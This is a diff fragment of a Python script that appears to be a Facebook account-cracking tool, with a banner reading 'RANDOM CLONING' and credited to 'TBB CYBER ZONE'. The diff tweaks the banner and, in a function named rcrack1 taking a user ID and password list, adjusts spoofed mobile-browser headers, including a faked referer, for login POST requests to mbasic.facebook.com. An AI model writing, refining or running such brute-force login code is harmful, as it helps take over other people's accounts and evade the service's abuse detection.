@@ -328,21 +328,21 @@ logo = ("""
                                                                                  
                                                                                                
 
-\033[1;94m       [+]==============================================[+]
+\033[1;94m       [+]==============================================
 
-\033[1;94m       [+]        CREATED BY   :  TUSHAR               \033[1;94m.       [+]
+\033[1;94m       [+]        CREATED BY   :  TUSHAR               \033[1;94m
 
-\033[1;94m       [+]        ON GITHUB    :  TBBCYBERZONE               \033[1;94m.[+]
+\033[1;94m       [+]        ON GITHUB    :  TBBCYBERZONE               \033[1;94m
 
-\033[1;94m       [+]        TEAM         :  TBB CYBER ZONE        \033[1;94m.    [+]
+\033[1;94m       [+]        TEAM         :  TBB CYBER ZONE        \033[1;94m
 
-\033[1;94m       [+]        TOOL VERSION :  1.0.1                    \033[1;94m.        [+]
+\033[1;94m       [+]        TOOL VERSION :  1.0.1                    \033[1;94m
 
-\033[1;94m       [+]        TOOL STATUS  :  RANDOM CLONING         \033[1;94m[+]
+\033[1;94m       [+]        TOOL STATUS  :  RANDOM CLONING         \033[1;94m
 
-\033[1;94m       [+]        COUNTRY      :  BANGLADESH             \033[1;94m.   [+]
+\033[1;94m       [+]        COUNTRY      :  BANGLADESH             \033[1;94m
 
-\033[1;94m       [+]===============================================[+]
+\033[1;94m       [+]===============================================
 
 """)                                              
 
@@ -507,40 +507,40 @@ def rcrack1(uid,pwx,tl):
             'method':'POST',
 
             'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
-
+    
             'scheme':'https',
-
+    
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-
+    
             'accept-language': 'en-US,en;q=0.9',
-
+    
             'cache-control': 'max-age=0',
-
-            'referer': 'https://mbasic.facebook.com/',
-
+    
+            'referer': 'https://www.google.com/',
+    
             'sec-ch-prefers-color-scheme': 'light',
-
+    
             'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-
-             'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-
+    
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+    
             'sec-ch-ua-mobile': '?1',
-
+    
             'sec-ch-ua-platform': '"Android"',
-
+    
             'sec-ch-ua-platform-version': '"11.0.0"',
-
+    
             'sec-fetch-dest': 'document',
-
+    
             'sec-fetch-mode': 'navigate',
-
+    
             'sec-fetch-site': 'cross-site',
-            
+    
             'sec-fetch-user': '?1',
-            
+    
             'upgrade-insecure-requests': '1',
-            
-            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+    
+            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5','viewport-width': '980',}
 
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
 
